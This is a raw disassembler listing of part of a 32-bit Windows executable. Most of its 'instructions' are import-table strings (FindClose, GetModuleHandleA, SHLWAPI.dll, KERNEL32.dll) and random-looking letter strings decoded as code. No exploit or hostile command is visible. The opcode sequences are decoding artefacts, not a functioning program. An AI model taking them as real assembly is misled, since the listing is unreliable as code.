  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	fnsave [edi+0x36]
  413baa:	inc    ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	hlt    
  413bf5:	add    BYTE PTR [ebx+0x0],al
  413bf8:	pop    ecx
  413bf9:	dec    ecx
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    BYTE PTR [edx+0x11],ch
  413c46:	inc    ebx
  413c47:	add    BYTE PTR [eax],al
  413c49:	add    BYTE PTR [eax],al
  413c4b:	add    BYTE PTR [eax+eax*1+0x46],al
  413c4f:	add    BYTE PTR [ecx+0x0],ch
  413c52:	outs   dx,DWORD PTR ds:[esi]
  413c53:	add    BYTE PTR [edx+0x0],cl
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
